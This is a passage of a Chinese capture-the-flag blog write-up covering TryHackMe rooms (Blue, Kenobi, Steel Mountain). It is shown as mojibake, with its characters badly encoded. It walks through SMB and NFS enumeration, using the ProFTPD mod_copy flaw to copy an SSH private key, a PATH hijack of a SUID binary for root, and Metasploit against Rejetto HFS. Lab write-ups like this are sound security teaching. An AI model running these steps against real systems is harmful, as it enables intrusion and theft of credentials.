¹ç›®å½•ä¸­æ‰¾åˆ°ã€‚ æ ‡å¿—2ï¼šè¯¥æ ‡å¿—å¯ä»¥åœ¨ Windows ä¸­å­˜å‚¨å¯†ç çš„ä½ç½®æ‰¾åˆ°ã€‚ å‹˜è¯¯è¡¨ï¼šWindows ç¡®å®ä¸å–œæ¬¢æ­¤æ ‡å¿—çš„ä½ç½®ï¼Œå¹¶ä¸”å¶å°”ä¼šåˆ é™¤å®ƒã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯èƒ½éœ€è¦ç»ˆæ­¢/é‡æ–°å¯åŠ¨è®¡ç®—æœºå¹¶é‡æ–°è¿è¡Œæ¼æ´åˆ©ç”¨ç¨‹åºæ‰èƒ½æ‰¾åˆ°æ­¤æ ‡å¿—ã€‚è¿™ç§æƒ…å†µç›¸å¯¹ç½•è§ï¼Œä½†ä¹Ÿæœ‰å¯èƒ½å‘ç”Ÿã€‚ ä½ç½®å­˜åœ¨äºWindowsçš„system32ä¸‹çš„configç›®å½•ä¸‹ æ ‡å¿—3ï¼šè¿™é¢æ——å¸œå¯ä»¥åœ¨ä¸€ä¸ªç»ä½³çš„ä½ç½®æ‰¾åˆ°ï¼Œå¯ä»¥è¿›è¡Œæ å¤ºã€‚æ¯•ç«Ÿï¼Œç®¡ç†å‘˜é€šå¸¸ä¼šä¿å­˜ä¸€äº›éå¸¸æœ‰è¶£çš„ä¸œè¥¿ã€‚ æ€»ç»“ ä¾æ—§æ˜¯nmapæ‰«æï¼Œå‘ç°æ•æ„Ÿç«¯å£445ï¼Œè”æƒ³åˆ°æ°¸æ’ä¹‹è“ï¼Œç›´æ¥msf exploitï¼Œå‘ç°æˆåŠŸï¼Œæ¥ä¸‹æ¥ä¸ºäº†æ–¹ä¾¿ï¼Œæƒ³åŠæ³•å°†è¯¥shellè½¬å˜ä¸ºmeterpreter shellï¼Œé€‰æ‹©postä¸­çš„æŸä¸ªæ¨¡å—ï¼ŒæˆåŠŸè½¬æ¢ï¼Œæ¥ç€å°±æ˜¯ææƒï¼Œé‡‡ç”¨migrate è¿›ç¨‹IDæ¥ææƒï¼Œè¿ç§»è¿›ç¨‹æˆåŠŸä¹‹åï¼Œå°±æå‡äº†æƒé™ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾æ•æ„Ÿæ–‡ä»¶ï¼šæ¯”å¦‚æ ¹ç›®å½•ã€Windows\\system32\\configç›®å½•ï¼Œä»¥åŠç”¨æˆ·å¯¹åº”çš„documentç›®å½• 0x03 KenobiæŒ‘æˆ˜ æœ‰å…³åˆ©ç”¨ Linux æœºå™¨çš„æ¼”ç»ƒã€‚æšä¸¾ Samba å…±äº«ã€æ“çºµ proftpd çš„æ˜“å—æ”»å‡»ç‰ˆæœ¬å¹¶é€šè¿‡è·¯å¾„å˜é‡æ“çºµæ¥å‡çº§æ‚¨çš„æƒé™ã€‚ æœ¬ä¼šè®®å®¤å°†ä»‹ç»è®¿é—® Samba å…±äº«ã€æ“çºµ proftpd çš„æ˜“å—æ”»å‡»ç‰ˆæœ¬ä»¥è·å¾—åˆå§‹è®¿é—®æƒé™ä»¥åŠé€šè¿‡ SUID äºŒè¿›åˆ¶æ–‡ä»¶å°†æ‚¨çš„æƒé™å‡çº§ä¸º rootã€‚ æšä¸¾Sambaå…±äº« Samba æ˜¯é€‚ç”¨äº Linux å’Œ Unix çš„æ ‡å‡† Windows äº’æ“ä½œç¨‹åºå¥—ä»¶ã€‚å®ƒå…è®¸æœ€ç»ˆç”¨æˆ·è®¿é—®å’Œä½¿ç”¨å…¬å¸å†…éƒ¨ç½‘æˆ–äº’è”ç½‘ä¸Šçš„æ–‡ä»¶ã€æ‰“å°æœºå’Œå…¶ä»–å¸¸ç”¨å…±äº«èµ„æºã€‚å®ƒé€šå¸¸è¢«ç§°ä¸ºç½‘ç»œæ–‡ä»¶ç³»ç»Ÿã€‚ Samba åŸºäºæœåŠ¡å™¨æ¶ˆæ¯å— (SMB) çš„é€šç”¨å®¢æˆ·ç«¯/æœåŠ¡å™¨åè®®ã€‚ SMB æ˜¯ä¸“é—¨ä¸º Windows å¼€å‘çš„ï¼Œå¦‚æœæ²¡æœ‰ Sambaï¼Œå…¶ä»–è®¡ç®—æœºå¹³å°å°±ä¼šä¸ Windows æœºå™¨éš”ç¦»ï¼Œå³ä½¿å®ƒä»¬æ˜¯åŒä¸€ç½‘ç»œçš„ä¸€éƒ¨åˆ†ã€‚ ä½¿ç”¨ nmap æˆ‘ä»¬å¯ä»¥æšä¸¾ SMB å…±äº«çš„æœºå™¨ï¼ŒNmap èƒ½å¤Ÿè‡ªåŠ¨è¿è¡Œå„ç§ç½‘ç»œä»»åŠ¡ã€‚æœ‰ä¸€ä¸ªè„šæœ¬å¯ä»¥æšä¸¾å…±äº«ï¼ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.67.234 SMB æœ‰ä¸¤ä¸ªç«¯å£ï¼š445 å’Œ 139ã€‚ é¦–å…ˆnmapå¸¸è§„æ‰«æï¼šnmap -sS -sV -p- -T4 10.10.67.234 è¿™é‡Œæœ‰ç‚¹ä¸æ¸…æ¥šï¼Œä¸ºä½•ç­”æ¡ˆæ˜¯7ä¸ªç«¯å£ï¼Œç”¨äº†hintçš„ nmapå‘½ä»¤ï¼Œå‘ç°è¿˜çœŸæ˜¯7ä¸ªï¼Œæœ‰ç‚¹ä¸ç†è§£ï¼ˆå¯èƒ½æ˜¯æˆ‘å…¨ç«¯å£æ‰«æçš„ç¼˜æ•…å§ï¼‰ Sambaç›‘å¬ç«¯å£æœ‰ï¼šTCPå’ŒUDP------tcpç«¯å£ç›¸å¯¹åº”çš„æœåŠ¡æ˜¯smbdæœåŠ¡ï¼Œå…¶ä½œç”¨æ˜¯æä¾›å¯¹æœåŠ¡å™¨ä¸­æ–‡ä»¶ã€æ‰“å°èµ„æºçš„å…±äº«è®¿é—®ï¼›udpç«¯å£ç›¸å¯¹åº”çš„æœåŠ¡æ˜¯nmbdæœåŠ¡ï¼Œå…¶ä½œç”¨æ˜¯æä¾›åŸºäºNetBIOSä¸»æœºåç§°çš„è§£æã€‚ nmapæœ‰ä¸€ä¸ªç”¨äºæšä¸¾SMBå…±äº«çš„è„šæœ¬ï¼Œä½¿ç”¨ nmapï¼Œæˆ‘ä»¬å¯ä»¥æšä¸¾ä¸€å°æœºå™¨çš„SMB å…±äº«ã€‚ ç»§ç»­æ‰¾SMBçš„å…±äº«ï¼šnmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.67.234 #ä¹Ÿå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼šsmbclient -L \\\\\\\\10.10.54.34\\\\ ä½¿ç”¨smbclientå‘½ä»¤ï¼ŒåŒ¿åè¿æ¥ç›®æ ‡æœºçš„SMBå…±äº«ï¼ŒæŸ¥çœ‹å…±äº«ç³»ç»Ÿä¸Šå­˜åœ¨ä»€ä¹ˆæ–‡ä»¶ smbclient //10.10.67.234/anonymous #è¿™é‡Œä¸ç”¨è¾“å…¥å¯†ç ç›´æ¥è¿›å…¥å³å¯ çœ‹åˆ°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªlog.txtæ–‡ä»¶ã€‚ä½ å¯ä»¥ä½¿ç”¨smbgetå‘½ä»¤ï¼Œé€šè¿‡åŒ¿åç”¨æˆ· é€’å½’åœ°ä¸‹è½½æ•´ä¸ªSMB å…±äº«ï¼Œå…±äº«ç³»ç»Ÿä¸­çš„æ–‡ä»¶å°†ä¼šè¢«ä¸‹è½½åˆ°æœ¬åœ° smbget smb://10.10.67.234/anonymous/log.txt è¿™é‡Œçš„smbgetå‘½ä»¤å‡ºé—®é¢˜äº†ï¼Œè¯´æ˜¯è§£æé¡ºåºä¸æ­£ç¡®ï¼Œçœ‹äº†æ–‡ç« å»æ”¹é…ç½®æ–‡ä»¶smb.confä½†æ˜¯æ²¡æ‰¾åˆ°ç›¸å…³é€‰é¡¹ï¼ŒçœŸæ˜¯æœäº†ï¼Œçœ‹äº†å®˜æ–¹æ–‡æ¡£ä¹Ÿæ²¡æœ‰æ•ˆæœã€‚è¿™é‡Œæˆ‘å°±æ— å¥ˆæŒ‡å®šæ–‡ä»¶ä¸‹è½½äº†ï¼Œ-Ré€‰é¡¹ç”¨ä¸äº†ã€‚ã€‚ã€‚ã€‚ æŸ¥çœ‹æ¥è‡ªå…±äº«ç³»ç»Ÿçš„log.txtæ–‡ä»¶å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥è·å–ä¸¤ä¸ªä¿¡æ¯ï¼š ä¸ºKenobiç”¨æˆ·ç”Ÿæˆ SSH å¯†é’¥æ—¶çš„ä¿¡æ¯â€“Kenobiç”¨æˆ·çš„sshå¯†é’¥â€“ä¿å­˜åœ¨/home/kenobi/.sshè·¯å¾„ä¸‹ æœ‰å…³ ProFTPD æœåŠ¡å™¨çš„ä¿¡æ¯ï¼ˆ è¿è¡ŒFTPæœåŠ¡çš„ç”¨æˆ·æ˜¯ Kenobiï¼‰ ä¹‹å‰çš„ç«¯å£æ‰«ææ˜¾ç¤ºäº† ç«¯å£111æ­£åœ¨è¿è¡ŒrpcbindæœåŠ¡ï¼Œrpcbindæ˜¯ä¸€ä¸ªå°†è¿œç¨‹ç¨‹åºè°ƒç”¨(RPC-- remote procedure call)çš„ç¨‹åºå·è½¬æ¢ä¸ºé€šç”¨åœ°å€çš„æœåŠ¡å™¨ã€‚å½“ä¸€ä¸ªRPC æœåŠ¡å¯åŠ¨æ—¶ï¼Œå®ƒä¼šå‘Šè¯‰ rpcbind å®ƒæ­£åœ¨ç›‘å¬çš„åœ°å€ä»¥åŠå®ƒå‡†å¤‡å¯ç”¨çš„æœåŠ¡æ‰€å¯¹åº”çš„RPCç¨‹åºç¼–å·ã€‚ æŸ¥çœ‹æœ¬ä¾‹ä¸­ç«¯å£111çš„nmapæ‰«æä¿¡æ¯ï¼Œå¯ä»¥å‘ç°nfsï¼ˆnetwork file systemï¼‰æœåŠ¡è¢«è¿œç¨‹å¯ç”¨ï¼Œæ¥ä¸‹æ¥å°è¯•æšä¸¾nfsä¿¡æ¯ï¼š nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.67.234 ä½¿ç”¨ ProFtpd è·å¾—åˆå§‹è®¿é—®æƒé™ ProFtpd æ˜¯ä¸€ä¸ªå…è´¹çš„å¼€æº FTP æœåŠ¡å™¨ï¼Œå…¼å®¹ Unix å’Œ Windows ç³»ç»Ÿã€‚åœ¨è¿‡å»çš„è½¯ä»¶ç‰ˆæœ¬ä¸­ï¼Œå®ƒä¹Ÿå®¹æ˜“å—åˆ°æ”»å‡»ã€‚ å¯ä»¥ä½¿ç”¨netcatæ¥è¿æ¥FTPæœåŠ¡ï¼Œçœ‹å…¶ç‰ˆæœ¬ä¿¡æ¯nc ip 21 æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ searchsploit æ¥æŸ¥æ‰¾ç‰¹å®šè½¯ä»¶ç‰ˆæœ¬çš„æ¼æ´ã€‚Searchsploit åŸºæœ¬ä¸Šåªæ˜¯ exploit-db.com çš„å‘½ä»¤è¡Œæœç´¢å·¥å…·ã€‚ ProFTPd è¿è¡Œæœ‰å¤šå°‘æ¼æ´ï¼Ÿ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¯¥ç‰ˆæœ¬ProFtpdçš„mod_copyæ¨¡å—ä¸­å­˜åœ¨æ¼æ´ã€‚ ï¼ˆmod_copyæ¨¡å—åŠŸèƒ½-å‚è€ƒé“¾æ¥ï¼šhttp://www.proftpd.org/docs/contrib/mod_copy.html ï¼‰ mod_copyæ¨¡å—å®ç°äº†SITE CPFR å’Œ SITE CPTO å‘½ä»¤(ç±»ä¼¼äº RNFR å’Œ RNTO) ï¼Œè¿™äº›å‘½ä»¤å¯ä»¥ç”¨æ¥å°†æ–‡ä»¶/ç›®å½•ä»æœåŠ¡å™¨ä¸Šçš„ä¸€ä¸ªåœ°æ–¹å¤åˆ¶åˆ°å¦ä¸€ä¸ªåœ°æ–¹ï¼Œè€Œæ— éœ€å°†æ•°æ®ä¼ è¾“åˆ°å®¢æˆ·ç«¯å¹¶ç­‰å¾…è¿”å›ï¼ˆæ— èº«ä»½éªŒè¯ï¼‰ï¼Œè¯¥æ¨¡å—åŒ…å«åœ¨ ProFTPD 1.3.x çš„ mod_copy.c æ–‡ä»¶ä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸è¿›è¡Œç¼–è¯‘ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼šä»»ä½•æœªç»èº«ä»½éªŒè¯çš„å®¢æˆ·æœºéƒ½å¯ä»¥åˆ©ç”¨SITE CPFR å’Œ SITE CPTO å‘½ä»¤ï¼Œå°†æ–‡ä»¶ä»FTPæœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»Ÿçš„ä»»ä½•ä½ç½®å¤åˆ¶åˆ°é€‰å®šçš„ä½ç½®ã€‚ ç”±ä¹‹å‰çš„ä¿¡æ¯æˆ‘ä»¬çŸ¥é“ï¼šKenobiæ˜¯è¿è¡ŒFTPæœåŠ¡çš„ç”¨æˆ·ã€Kenobiç”¨æˆ·çš„sshå¯†é’¥ä¿å­˜è·¯å¾„ã€‚ ç°åœ¨æˆ‘ä»¬å°†ä½¿ç”¨ SITE CPFR å’Œ SITE CPTO å‘½ä»¤å¤åˆ¶Kenobiçš„sshç§é’¥ï¼Œæˆ‘ä»¬å°†ç§é’¥å¤åˆ¶åˆ°NFSæ‰€æŒ‚è½½çš„ç›®å½•ä¸‹ï¼Œåç»§æˆ‘ä»¬å°±èƒ½è·å–åˆ°è¿™ä¸ªç§é’¥æ–‡ä»¶ï¼š #è¿æ¥ç›®æ ‡æœºçš„FTPæœåŠ¡å™¨,FTPè¿è¡Œåœ¨21ç«¯å£ nc 10.10.54.34 21 SITE CPFR /home/kenobi/.ssh/id_rsa SITE CPTO /var/tmp/id_rsa #å°†å¯†é’¥å¤åˆ¶åˆ°NFSæ‰€æŒ‚è½½çš„/varç›®å½•ä¸‹ ç„¶åè®©æˆ‘ä»¬å°†ç›®æ ‡æœºçš„/var/tmp ç›®å½•æŒ‚è½½åˆ°æˆ‘ä»¬çš„æ”»å‡»æœºä¸Šï¼š mkdir /mnt/kenobiNFS mount 10.10.54.34:/var /mnt/kenobiNFS #æ­¤å¤„çš„ipæ˜¯ç›®æ ‡æœºipã€‚å®ŒæˆæŒ‚è½½åï¼šç›®æ ‡æœºçš„/varç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œéƒ½å°†åœ¨æ”»å‡»æœºçš„/mnt/kenobiNFSç›®å½•ä¸‹ ls -la /mnt/kenobiNFS å¤åˆ¶Kenobiçš„sshç§é’¥åˆ°æ”»å‡»æœºå½“å‰ç›®å½•ï¼Œç„¶åä½¿ç”¨sshç™»å½•åˆ° Kenobi çš„å¸æˆ·ï¼ŒæŸ¥çœ‹æ ‡å¿—æ€§æ–‡ä»¶ï¼š cp /mnt/kenobiNFS/tmp/id_rsa . chmod 600 id_rsa ssh -i id_rsa kenobi@10.10.67.234 -oHostKeyAlgorithms=+ssh-rsa è¿™æ¡å‘½ä»¤æ˜¯åœ¨Linuxç³»ç»Ÿä¸­ä½¿ç”¨OpenSSHå®¢æˆ·ç«¯è¿æ¥åˆ°è¿œç¨‹ä¸»æœºçš„å‘½ä»¤è¡Œè¯­å¥ã€‚å…¶ä¸­ï¼Œæ¯ä¸ªå‚æ•°çš„å«ä¹‰å¦‚ä¸‹ï¼š sshï¼šOpenSSHå®¢æˆ·ç«¯å‘½ä»¤ï¼Œè´Ÿè´£è¿æ¥åˆ°è¿œç¨‹ä¸»æœºå¹¶å¯åŠ¨Shellã€‚ -iï¼šæŒ‡å®šä½¿ç”¨å“ªä¸ªç§é’¥æ–‡ä»¶è¿›è¡Œèº«ä»½è®¤è¯ã€‚ id_rsaï¼šæŒ‡å®šä½¿ç”¨~/.ssh/id_rsaæ–‡ä»¶ä½œä¸ºç§é’¥ã€‚ kenobiï¼šè¿œç¨‹ä¸»æœºçš„ç”¨æˆ·åã€‚ @ï¼šç”¨æˆ·åå’ŒIPåœ°å€ä¹‹é—´çš„åˆ†éš”ç¬¦ã€‚ 10.10.67.234ï¼šè¿œç¨‹ä¸»æœºçš„IPåœ°å€ã€‚ -oï¼šæŒ‡å®šè¿æ¥é€‰é¡¹ã€‚ HostKeyAlgorithmsï¼šæŒ‡å®šå…è®¸ä½¿ç”¨çš„ä¸»æœºå¯†é’¥ç®—æ³•ã€‚ +ssh-rsaï¼šæŒ‡å®šå…è®¸ä½¿ç”¨RSAç­¾åå¯†é’¥ç®—æ³•è¿›è¡Œè¿æ¥ã€‚ æ€»ä¹‹ï¼Œè¿™æ¡å‘½ä»¤çš„ä½œç”¨æ˜¯ä½¿ç”¨æŒ‡å®šçš„ç§é’¥(id_rsa)è¿æ¥åˆ°è¿œç¨‹ä¸»æœº(10.10.67.234)ï¼Œå¹¶å…è®¸ä½¿ç”¨RSAç­¾åå¯†é’¥ç®—æ³•è¿›è¡Œèº«ä»½è®¤è¯ã€‚ é€šè¿‡PATHå˜é‡ææƒ æˆ‘ä»¬å…ˆäº†è§£SUIDã€SGIDå’ŒSBIT(Sticky Bits)ï¼Œè¿™ä¸‰ä¸ªæ¦‚å¿µ æˆ‘ä»¬åœ¨ææƒåŸºç¡€ç¯‡æœ‰è¯¦ç»†è®²è§£ï¼š æƒé™ åœ¨æ–‡ä»¶ä¸Š åœ¨ç›®å½•ä¸Š SUID Bit ç”¨æˆ·ä½¿ç”¨æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™æ‰§è¡Œæ–‡ä»¶ - SGID Bit ç”¨æˆ·åœ¨ç»„æ‰€æœ‰è€…çš„æƒé™ä¸‹æ‰§è¡Œè¯¥æ–‡ä»¶ åœ¨ç›®å½•ä¸­åˆ›å»ºçš„æ–‡ä»¶è·å–ç›¸åŒçš„ç»„æ‰€æœ‰è€…ã€‚ Sticky Bit æ— æ„ä¹‰ é˜»æ­¢ç”¨æˆ·åˆ é™¤å…¶ä»–ç”¨æˆ·ç›®å½•ä¸‹çš„æ–‡ä»¶ SUIDä½æ˜¯å¾ˆä¸å®‰å…¨çš„ï¼Œä¸€äº›äºŒè¿›åˆ¶æ–‡ä»¶ç¡®å®éœ€è¦æé«˜æƒé™æ¥è¿è¡Œæ‰è¢«èµ‹äºˆSUIDä½(å¦‚/usr/bin/passwdï¼Œå› ä¸ºä½ éœ€è¦ä½¿ç”¨å®ƒä»¥ä¾¿åœ¨ç³»ç»Ÿä¸Šé‡ç½®ä¸ªäººå¯†ç )ï¼Œä½†æ˜¯å…¶ä»–å…·æœ‰ SUID ä½çš„è‡ªå®šä¹‰æ–‡ä»¶å¯èƒ½ä¼šå¯¼è‡´å„ç§å„æ ·çš„é—®é¢˜ã€‚ è¦åœ¨ç›®æ ‡æœºç³»ç»Ÿä¸­æœç´¢SUID/SGIDç±»å‹çš„æ–‡ä»¶ï¼Œè¯·åœ¨ç›®æ ‡æœºä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š find / -perm -u=s -type f 2&gt;/dev/null æ‰¾å‡ºçœ‹èµ·æ¥å¾ˆä¸å¯»å¸¸çš„æ–‡ä»¶/usr/bin/menu ï¼Œå¹¶å°è¯•æ‰§è¡Œå®ƒï¼š strings æ˜¯ Linux ä¸Šçš„ä¸€ä¸ªå‘½ä»¤ï¼Œå®ƒèƒ½åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸ŠæŸ¥æ‰¾äººç±»å¯è¯»çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹/usr/bin/menuè¿è¡Œæ—¶çš„ä¿¡æ¯ï¼ˆå› ä¸ºæ‰§è¡Œmenuå‘½ä»¤æ—¶æœ‰æ–‡å­—å›æ˜¾ï¼Œæˆ‘ä»¬æ‰ä½¿ç”¨stringså‘½ä»¤ï¼‰ï¼š strings /usr/bin/menu è§‚å¯Ÿä¸Šå›¾å¯ä»¥å¾—çŸ¥ï¼šå½“æˆ‘ä»¬æ‰§è¡Œ/usr/bin/menu æ—¶ï¼Œé€‰æ‹©é€‰é¡¹1å…¶å®æ˜¯åœ¨æ‰§è¡Œä¸€ä¸ªcurlå‘½ä»¤ï¼Œé€‰æ‹©é€‰é¡¹2å…¶å®æ˜¯åœ¨æ‰§è¡Œuname -rå‘½ä»¤ã€‚ è¿™è¡¨æ˜äºŒè¿›åˆ¶æ–‡ä»¶curlå’Œunameï¼Œæ˜¯åœ¨æ²¡æœ‰å®Œæ•´è·¯å¾„çš„æƒ…å†µä¸‹è¿è¡Œçš„(ä¾‹å¦‚æ²¡æœ‰ä½¿ç”¨/usr/bin/curl æˆ–/usr/bin/unameè¿è¡Œæ–‡ä»¶)ã€‚ æˆ‘ä»¬å·²ç»çŸ¥é“/usr/bin/menuæ–‡ä»¶æ˜¯ä¸€ä¸ªSUIDæ–‡ä»¶ï¼Œå®ƒåœ¨æ‰§è¡Œæ—¶ä¼šæš‚æ—¶å…·æœ‰root ç”¨æˆ·æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•è‡ªå®šä¹‰åˆ›å»ºä¸€ä¸ªcurlæ–‡ä»¶ï¼ˆå¹¶å†™å…¥/bin/bashï¼Œæ„æ€æ˜¯æ‰“å¼€ä¸€ä¸ªbash shellï¼‰ï¼Œç„¶åæˆ‘ä»¬å†ç»™è‡ªå®šä¹‰çš„curlæ–‡ä»¶é™„åŠ å¯æ‰§è¡Œæƒé™ï¼ˆ+xï¼‰ï¼Œæ¥ç€å°†è‡ªå®šä¹‰çš„curlæ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„æ·»åŠ åˆ°PATHå˜é‡ä¸­ï¼ˆè¿™æ ·èƒ½å¤Ÿä¿è¯æˆ‘ä»¬è‡ªå®šä¹‰çš„curlæ–‡ä»¶èƒ½å¤Ÿè¢«é¦–å…ˆæ‰¾åˆ°ï¼‰ã€‚ å®Œæˆä»¥ä¸Šæ“ä½œä¹‹åï¼Œæ‰§è¡ŒSUIDæ–‡ä»¶/usr/bin/menuï¼Œäº§ç”Ÿçš„æ•ˆæœæ˜¯ï¼šä»¥rootæƒé™æ‰“å¼€ä¸€ä¸ªbash shell-----è¿™å°†è·å¾—root shell cd /tmp echo /bin/bash &gt; curl chmod +x curl export PATH=/tmp:$PATH #æ–°æ·»åŠ çš„è·¯å¾„/tmpä¼šåœ¨PATHå˜é‡çš„æœ€å‰é¢ï¼Œè¿™æ ·å°±èƒ½ç”¨æˆ‘ä»¬ä¼ªé€ çš„curlæ–‡ä»¶ä»£æ›¿çœŸå®çš„curlæ–‡ä»¶ï¼Œä¿è¯è‡ªå®šä¹‰çš„curlæ–‡ä»¶è¢«æˆåŠŸæ‰§è¡Œ /usr/bin/menu #åœ¨è·³å‡ºé€‰é¡¹æ—¶ï¼Œæˆ‘ä»¬é€‰æ‹©é€‰é¡¹1ï¼Œè¿™æ ·å°±èƒ½è°ƒç”¨åˆ°ä¼ªé€ çš„curlæ–‡ä»¶ ls /root/ cat /root/root.txt æ€»ç»“ è¿™é‡Œæ¶‰åŠçš„çŸ¥è¯†æœ‰ç‚¹å¤šï¼šæ€è·¯æ˜¯nmapå¸¸è§„æ‰«æï¼Œå‘ç°445å’Œ139ç«¯å£æš´éœ²ï¼Œæ¥ç€å°è¯•æšä¸¾Sambaå…±äº«ï¼Œå‘ç°å­˜åœ¨ä¸‰ä¸ªå…±äº«çš„è·¯å¾„ï¼Œå¹¶ä¸”å…¶ä¸­æœ‰çš„å¯ä»¥åŒ¿åè®¿é—®ï¼Œè®¿é—®æˆåŠŸä¹‹åï¼Œå‘ç°å…¶ä¸­æœ‰ä¸ªlog.txtæ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥å‘ç°å…¶ä¸­å«æœ‰kenobiç”¨æˆ·çš„sshç§˜é’¥ä»¥åŠProFtpdä¿¡æ¯ã€‚ æ¥ç€åˆ©ç”¨ç«¯å£111çš„rpcbindæœåŠ¡ï¼Œå‘ç°è¯¥æœåŠ¡å¯åŠ¨äº†nfsï¼Œä¹‹åæšä¸¾nfså‘ç°å­˜åœ¨2ä¸ªå¯ä»¥è¿œç¨‹å…±äº«è®¿é—®çš„ç›®å½•ï¼Œçœ‹åˆ°ç¬¬äºŒä¸ªç›®å½•ä¸‹å­˜åœ¨çš„ä¿¡æ¯å¾ˆå¤šï¼Œå°è¯•ä¹‹åæŒ‚è½½è¯¥ç›®å½•åˆ°æˆ‘ä»¬æœ¬åœ°ä¸Šã€‚æ¥ç€çœ‹ä¸€ä¸‹å½“å‰ftpæœåŠ¡å¯¹åº”ç‰ˆæœ¬ï¼Œå‘ç°å­˜åœ¨ç›¸å…³æ¼æ´ï¼Œåˆ©ç”¨è¯¥æ¼æ´ï¼Œç›´æ¥å°†é¶æœºçš„sshç§˜é’¥æ–‡ä»¶ä¸‹è½½åˆ°äº†æˆ‘ä»¬è¦æŒ‚è½½çš„ç›®å½•ä¸Šã€‚æ¥ç€ç”¨nfsæŒ‚è½½åˆ°æˆ‘ä»¬æœ¬åœ°ä¸Šä¹‹åï¼ŒæˆåŠŸæ‹¿åˆ°sshç§˜é’¥ï¼Œæ¥ç€sshç™»å½•ï¼Œä¹‹åå°±æ˜¯ææƒäº†ï¼Œä¸è¿‡è¿™é‡Œç”¨ç®—æ˜¯ä¸ªç¯å¢ƒå˜é‡åŠ«æŒå§ã€‚ å…ˆæ˜¯å‘ç°å¯¹æ–¹çš„suidæ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªå¯ä»¥çš„æ–‡ä»¶menuå‘ç°å…¶ä¸­æ‰§è¡Œäº†curlçš„å‘½ä»¤ï¼Œç„¶åæˆ‘ä»¬å°è¯•å°†/bin/bashå†™å…¥åˆ°curlå‘½ä»¤ä¸­ï¼Œç„¶åå°†è¯¥curlå¯¹åº”çš„è·¯å¾„ææ·»åŠ åˆ°ç¯å¢ƒå˜é‡æœ€å‰é¢ï¼Œå°±ç›¸å½“äºå‘½ä»¤æ›¿æ¢äº†ï¼Œæ¥ç€è¿è¡Œmenuæ–‡ä»¶ï¼ˆå±ä¸»ä¸ºrootï¼‰ï¼Œç›¸å½“äºä»¥rootç”¨æˆ·è¿è¡Œäº†/bin/bashï¼Œä¹Ÿå°±ææƒäº† 0x04 Steel MountainæŒ‘æˆ˜ é—¯å…¥ä»¥æœºå™¨äººå…ˆç”Ÿä¸ºä¸»é¢˜çš„ Windows æœºå™¨ã€‚ä½¿ç”¨ metasploit è¿›è¡Œåˆå§‹è®¿é—®ï¼Œåˆ©ç”¨ powershell è¿›è¡Œ Windows æƒé™æå‡æšä¸¾ï¼Œå¹¶å­¦ä¹ è·å–ç®¡ç†å‘˜è®¿é—®æƒé™çš„æ–°æŠ€æœ¯ã€‚ åœ¨æ­¤èŠå¤©å®¤ä¸­ï¼Œä½ å°†æšä¸¾ä¸€å° Windows è®¡ç®—æœºï¼Œä½¿ç”¨ Metasploit è·å¾—åˆå§‹è®¿é—®æƒé™ï¼Œä½¿ç”¨ Powershell è¿›ä¸€æ­¥æšä¸¾è¯¥è®¡ç®—æœºï¼Œå¹¶å°†æ‚¨çš„æƒé™æå‡ä¸ºç®¡ç†å‘˜ã€‚ å¦‚æœæ‚¨æ²¡æœ‰åˆé€‚çš„å®‰å…¨å·¥å…·å’Œç¯å¢ƒï¼Œè¯·éƒ¨ç½²æ‚¨è‡ªå·±çš„ Kali Linux æœºå™¨ï¼Œå¹¶ä½¿ç”¨æˆ‘ä»¬çš„ Kali Room åœ¨æ‚¨çš„æµè§ˆå™¨ä¸­å¯¹å…¶è¿›è¡Œæ§åˆ¶ã€‚ è¯·æ³¨æ„ï¼Œæ­¤è®¡ç®—æœºä¸å“åº” ping ï¼ˆICMPï¼‰ï¼Œå¯èƒ½éœ€è¦å‡ åˆ†é’Ÿæ‰èƒ½å¯åŠ¨ã€‚ åˆå§‹è®¿é—® ä¹Ÿæ˜¯å¾ˆè¿·æƒ‘ï¼Œè‡³ä»Šè¿˜æ˜¯åœ¨æ‘¸ç´¢å¦‚ä½•æ‰èƒ½è¾ƒä¸ºæ°å½“çš„ä½¿ç”¨nmapæ‰«æå‘½ä»¤ï¼Œæ„Ÿè§‰é€‰çš„æ€»ä¸æ˜¯æœ€ä½³çš„ï¼Œæ…¢æ…¢ä½“ä¼šå§ nmap -Pn -sV -sC 10.10.97.69 é™¤äº†é»˜è®¤çš„80ç«¯å£ä¹‹å¤–ï¼Œç›®æ ‡ç«™ç‚¹è¿˜å¼€æ”¾äº†8080ç«¯å£æä¾›httpæœåŠ¡ï¼ŒæŸ¥çœ‹8080ç«¯å£çš„webserveré¡µé¢ï¼š å¯è§è¿™é‡Œçš„æ–‡ä»¶æœåŠ¡å™¨æ˜¯rejetto http file server msfconsole -q #è·³è¿‡æç¤ºè¯­æ‰“å¼€msf search Rejetto use exploit/windows/http/rejetto_hfs_exec options set RHOSTS 10.10.97.69 set RPORT 8080 set LHOST 10.11.81.232 #å½“ä½¿ç”¨OpenVPNè¿æ¥åˆ°TryHackMeå†…ç½‘æ—¶ï¼Œéœ€è¦è®¾ç½®è¯¥é€‰é¡¹ä¸ºtun0åœ°å€ exploit #æˆ–è€…run shell #ç”±meterpreter shellç•Œé¢è¿›å…¥Windows shellç•Œé¢ cd C:\\Users\\bill\\Desktop\\ dir more user.txt æƒé™æå‡ ç°åœ¨ï¼Œæ‚¨åœ¨æ­¤ Windows 